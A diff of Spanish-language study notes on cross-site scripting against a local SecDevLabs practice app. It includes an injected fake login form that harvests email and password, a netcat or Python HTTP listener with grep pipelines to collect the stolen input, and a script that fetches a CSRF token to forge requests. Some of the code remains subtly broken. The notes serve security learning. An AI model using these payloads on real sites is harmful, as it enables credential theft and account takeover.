@@ -1,11 +1,11 @@
 > Esta vulnerabilidad se da mas que nada en sitios web y permite a un atacante inyectar codigo javascript
 
 ## Herramientas
-- [SecDevLabs](https://github.com/globocom/secDevLabs)
+- [[SecDevLabs]]
 
 ## Caso practico
 - Una vez clonado el repositorio SecDevLabs, accedemos a `/owasp-top10-2021-apps/a3/gossip-world` y ejecutas `make install`
-- La web empieza a correr por el puerto 10007 en local, vemos que se pueden mandar como formularios, son estos los que vamos a vulnerar
+- La web empieza a correr por `localhost:10007` en local, vemos que se pueden mandar como formularios, son estos los que vamos a vulnerar.
 
 ### Inyeccion directa de codigo
 - Dentro de `gossip-world` en la seccion del mensaje podemos ingresar codigo html, por ejemplo un h1, una lista, etc.
@@ -23,19 +23,20 @@
 </script>
 </body>
 ```
-- Algo mucho mas sofisticado
-```javascript
+- En tu maquina local deberias hacer un `python3 -m http.server 80` para recibir el email, sino tambien con `nc -nlvp 80` para ponernos en escucha por el puerto 80.
+- Algo mucho mas sofisticado:
+```html
 <div id="formContainer"></div>
 
 <script>
 	var email;
 	var password;
 	
-	var form = ```<form>
-		Email: <input id="email" type="email" required>
-		Password: <input id="password" type="password" required>
-		<input type="button" onClick="submitForm" value="Submit">
-	</form>```;
+	var form = '<form>'+
+		'Email: <input id="email" type="email" required>'+
+		'Password: <input id="password" type="password" required>'+
+		'<input type="button" onClick="submitForm()" value="Submit">'+
+	'</form>';
 	
 	document.getElementById("formContainer").innerHTML = form;
 	
@@ -59,11 +60,12 @@
 	};
 </script>
 ```
-
+`python3 -m http.server 80 2>&1 | grep -oP "GET.*"`
 ### Expresiones regulares
-`grep -oP "GET.*"`
-`grep -oP "GET /\k.*"`
-`grep -oP "GET /\k.*[^.*\s]+"` 
+`grep -oP "GET.*"` - toma desde el get en adelante
+`grep -oP "GET /\k.*"` - resetea desde el get y toma lo de delante
+`grep -oP "GET /\k.*[^.*\s]+"` - solo toma lo tecleado
+`python3 -m http.server 80 2>&1 | grep --line-buffered -oP "GET /\K[^.*\s]+" | sed -u 's/%20/ /g'` - toma solo lo escrito y sin urlencode
 
 ### Redirigir
 ```javascript
@@ -81,23 +83,24 @@ request.send();
 ```
 
 ### csrf_token
-- Un **token CSRF** (Cross-Site Request Forgery) es un código secreto, único e impredecible que una aplicación web genera y envía al navegador del usuario para protegerse contra ataques de falsificación de solicitudes entre sitios, asegurando que las peticiones (como enviar un formulario) provengan realmente del usuario legítimo y no de un sitio malicioso, mediante la validación de que el token enviado coincide con el esperado por el servidor.
+>Un **token CSRF** (Cross-Site Request Forgery) es un código secreto, único e impredecible que una aplicación web genera y envía al navegador del usuario para protegerse contra ataques de falsificación de solicitudes entre sitios, asegurando que las peticiones (como enviar un formulario) provengan realmente del usuario legítimo y no de un sitio malicioso, mediante la validación de que el token enviado coincide con el esperado por el servidor.
 - Para esto utilizamos Burpsuite ya que vamos a interceptar la peticion para obtener el token csrf y colocarlo en otra peticion.
 ```javascript
 var domain = "http://localhost:10007/newgossip";
-var req1 = new XMLHttpRequest;
+var req1 = new XMLHttpRequest();
 req1.open('GET', domain, false);
 req1.withCredentials = true;
-re1.send();
+req1.send();
 
-var response = req1.responseText();
-var parse = DOMParser;
-var doc = parse.parserToString(response, 'txt/html');
+var response = req1.responseText;
+var parser = DOMParser;
+var doc = parser.parseFromString(response, 'txt/html');
 var token = doc.getElementByName("_csrf_token")[0].value;
 
-var req2 = XMLHttpRequest;
+var req2 = new XMLHttpRequest();
 var data = "title=hola&subtitle=chau&text=bye&_csrf_token="+token;
 req2.open('POST', 'http://localhost:10007/newgossip', false);
+req2.withCredentials = true;
 req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 req2.send(data);
 ```
@@ -105,4 +108,3 @@ req2.send(data);
 ## Maquina virtual
 - Fuente [vulnhub](https://www.vulnhub.com/)
 - Maquina virtual a resolver [MyExpense:1](https://www.vulnhub.com/entry/myexpense-1,405/)
-- 
